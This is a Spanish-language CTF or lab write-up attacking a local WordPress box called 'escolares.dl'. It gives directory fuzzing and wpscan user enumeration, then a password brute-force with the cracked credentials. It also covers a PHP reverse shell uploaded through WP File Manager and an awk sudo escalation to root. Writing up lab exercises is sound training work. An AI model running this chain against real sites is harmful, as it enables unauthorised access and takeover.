## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un blog de ciberseguridad pero no encuentro nada, decido fuzzear la web:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

Encuentro WordPress y el index no contiene nada interesante y vuelvo a hacerle fuzzing

```bash
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,xml,txt,js,html,sh
```

Si nos metemos a algun link nos redigira a una URL con dominio “escolares.dl” así que lo agrego al host:

```bash
sudo nano /etc/hosts
172.17.0.2 escolares.dl
```

Ahora que tengo acceso al login de WordPress realizo un escaneo a usuarios:

```bash
wpscan --url http://escolares.dl/wordpress -e u
```

Encuentro “luisillo”.

Voy a crear un diccionario especifico con cupp basado en : luis / luisillo.

Realizo un ataque de fuerza bruta:

```bash
wpscan --url http://escolares.dl/wordpress/ -U luisillo --passwords diccionario_cupp.txt
```

User : luisillo

Pass : Luis1981

Y consigo acceso al panel de wordpress.

Dentro veo que esta instalado el plugin de WP File Manager, donde toca insertar una shell:

```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

Luego la ejecuto antes poniendome a la escucha:

```bash
http://172.17.0.2/wordpress/wp-content/uploads/php-reverse-shell.php
```

## Escalada www-data → luisillo

```bash
ls -l /home
-rwxrwxrwx 1 root     root       23 Jun  8  2024 secret.txt
```

El archivo contiene la contraseña de luisillo:

```bash
luisillopasswordsecret
```

## Escalada luisillo → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/awk
```

Lo encuentro en Gtfo bins:

```bash
sudo -u root /usr/bin/awk 'BEGIN {system("/bin/bash -p")}'
```

Listo.
